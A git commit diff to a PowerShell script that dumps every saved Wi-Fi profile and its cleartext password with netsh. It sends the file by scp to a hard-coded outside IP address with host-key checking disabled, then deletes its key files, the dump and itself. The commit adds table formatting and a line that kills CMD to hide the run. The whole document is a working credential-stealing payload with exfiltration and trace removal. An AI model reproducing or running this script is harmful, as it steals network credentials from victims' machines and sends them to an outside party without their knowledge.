de4a3233c9b48b22847d52541ce31db3eadb279b
Nate Glaser <nate@wolf-paw.net>
2022-02-18 20:39:44 -0500

    killcmd

--- show-all-saved-wifi-passwords.ps1
+++ show-all-saved-wifi-passwords.ps1
@@ -1,6 +1,8 @@
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} >> asdf2.txt
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{PROFILE_NAME=$name;PASSWORD=$pass}} | Format-Table -AutoSize  >> asdf2.txt
+
 scp -o "StrictHostKeyChecking=no" -i ./asdf ./asdf2.txt nateg@147.182.151.141:/home/nateg/wifi/$env:computername
 Remove-Item '.\asdf'
 Remove-Item '.\asdf.pub'
 Remove-Item '.\asdf2.txt'
 Remove-Item '.\d.ps1'
+Stop-Process -name CMD
